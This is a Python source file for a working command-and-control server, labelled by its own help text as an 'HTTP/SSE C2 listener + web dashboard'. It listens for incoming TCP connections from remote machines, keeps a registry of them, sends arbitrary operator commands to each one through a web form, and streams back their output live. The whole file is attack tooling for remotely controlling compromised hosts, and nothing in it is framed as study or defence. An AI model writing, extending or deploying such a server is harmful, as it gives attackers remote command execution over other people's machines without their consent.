import argparse
import threading
import socket
import uuid
import time
from flask import Flask, jsonify, render_template, request, abort, Response

app = Flask(__name__, template_folder='templates')

# In-memory client registry: holds sock, addr, buffer, and stats per client
devices = {}
registry_lock = threading.Lock()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/clients')
def clients():
    with registry_lock:
        data = []
        for cid, info in devices.items():
            data.append({
                'id': cid,
                'addr': f"{info['addr'][0]}:{info['addr'][1]}",
                'connected_at': info['connected_at'],
                'last_seen': info.get('last_seen', info['connected_at']),
                'bytes_received': info.get('bytes_received', 0)
            })
    return jsonify(data)

@app.route('/client/<cid>')
def client_view(cid):
    with registry_lock:
        if cid not in devices:
            abort(404)
    return render_template('client.html', client_id=cid)

@app.route('/client/<cid>/cmd', methods=['POST'])
def client_cmd(cid):
    cmd = request.json.get('cmd')
    if not cmd:
        abort(400)
    with registry_lock:
        if cid not in devices:
            abort(404)
        conn = devices[cid]['sock']
    try:
        conn.sendall(cmd.encode() + b"\n")
        return ('', 204)
    except Exception:
        abort(500)

@app.route('/client/<cid>/stream')
def stream(cid):
    def generate():
        last_idx = 0
        while True:
            time.sleep(0.5)
            with registry_lock:
                info = devices.get(cid)
                if not info:
                    yield 'event: close\ndata: [DISCONNECTED]\n\n'
                    break
                buf = info['buffer']
            if last_idx < len(buf):
                chunk = buf[last_idx:]
                last_idx = len(buf)
                for line in chunk:
                    yield f"data: {line}\n\n"
    return Response(generate(), mimetype='text/event-stream')


def listener(host: str, port: int):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    sock.listen(5)
    print(f"[+] Listening for clients on {host}:{port}")
    while True:
        conn, addr = sock.accept()
        cid = uuid.uuid4().hex[:8]
        with registry_lock:
            devices[cid] = {
                'sock': conn,
                'addr': addr,
                'connected_at': time.strftime("%Y-%m-%d %H:%M:%S"),
                'buffer': [],
                'last_seen': time.strftime("%Y-%m-%d %H:%M:%S"),
                'bytes_received': 0
            }
        print(f"[+] New client {cid} from {addr}")
        threading.Thread(target=handle_client, args=(cid, conn), daemon=True).start()


def handle_client(cid: str, conn: socket.socket):
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            text = data.decode(errors='ignore')
            now = time.strftime("%Y-%m-%d %H:%M:%S")
            with registry_lock:
                info = devices.get(cid)
                if not info:
                    break
                normalized = text.replace('\r\n', '\n').replace('\r', '\n')
                info['buffer'].append(normalized)
                info['last_seen'] = now
                info['bytes_received'] += len(data)
            print(f"[{cid}] {text}")
    except Exception as e:
        print(f"[-] Error with client {cid}: {e}")
    finally:
        with registry_lock:
            devices.pop(cid, None)
        conn.close()
        print(f"[-] Client {cid} disconnected")

if __name__ == '__main__':
    p = argparse.ArgumentParser(description='HTTP/SSE C2 listener + web dashboard')
    p.add_argument('--listen-host', default='0.0.0.0')
    p.add_argument('--listen-port', type=int, required=True)
    p.add_argument('--web-port', type=int, default=8000)
    args = p.parse_args()

    threading.Thread(target=listener, args=(args.listen_host, args.listen_port), daemon=True).start()
    app.run(host='0.0.0.0', port=args.web_port)